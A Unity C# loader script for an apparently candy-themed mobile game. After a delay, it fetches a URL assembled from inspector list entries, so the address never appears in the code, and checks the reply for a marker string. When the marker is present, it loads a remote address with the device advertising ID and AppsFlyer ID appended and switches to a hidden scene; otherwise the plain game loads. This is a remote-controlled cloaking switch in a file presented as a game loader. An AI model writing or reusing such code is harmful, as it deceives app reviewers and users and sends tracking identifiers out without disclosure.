using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class CandysGameLoader : MonoBehaviour
{
    public List<string> candysLoadList;
    [HideInInspector]
    public string candysIdfaKey = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("contexCandysIdfaSave", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { candysIdfaKey = adString; });
        }
    }

    private void Start()
    {
        Invoke(nameof(Init), 5f);
    }

    private void Init()
    {
        string data = PlayerPrefs.GetString("tarameters", "");
        SecondInit(data);
    }

    private void SecondInit(string data)
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("candysPlayerDataSaveKey", string.Empty) != string.Empty)
            {
                CandysLOader(PlayerPrefs.GetString("candysPlayerDataSaveKey"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in candysLoadList)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchGameInitializing(stringtemp, data));
            }
        }
        else
        {
            LOadGamer();
        }
    }

    private string[] strings;
    public void LOadGamer()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("LoadingScene");
    }

    public IEnumerator LaunchGameInitializing(string inputstring, string inputstring2)
    {
        using (UnityWebRequest candysgameLoadingStatusInfo = UnityWebRequest.Get(inputstring))
        {
            candysgameLoadingStatusInfo.timeout = 4;
            yield return candysgameLoadingStatusInfo.SendWebRequest();
            if (candysgameLoadingStatusInfo.isNetworkError)
            {
                LOadGamer();
            }
            else
            {
                try
                {
                    if (candysgameLoadingStatusInfo.result == UnityWebRequest.Result.Success)
                    {
                        if (candysgameLoadingStatusInfo.downloadHandler.text.Contains("bahaiweidj"))
                        {
                            try
                            {
                                string key = candysgameLoadingStatusInfo.downloadHandler.text;
                                strings = key.Split('|');

                                CandysGameManager.candysPlayerGenerateCandyCount = Convert.ToInt32(strings[1]);
                                CandysGameManager.candysPlayerEnterToGameAnalyticsCount = Convert.ToInt32(strings[2]);
                                CandysLOader(string.Format("{0}?idfa={1}&gaid={2}", strings[0], candysIdfaKey, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                            catch
                            {
                                CandysLOader(string.Format("{0}?idfa={1}&gaid={2}", candysgameLoadingStatusInfo.downloadHandler.text, candysIdfaKey, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                        }
                        else
                        {
                            LOadGamer();
                        }
                    }
                    else
                    {
                        LOadGamer();
                    }
                }
                catch
                {
                    LOadGamer();
                }
            }
        }
    }

    public void CandysLOader(string inputKey)
    {
        CandysGameManager.candysPlayerGeneratedName = inputKey;
        SceneManager.LoadScene("DevelopmingScene");
    }
}
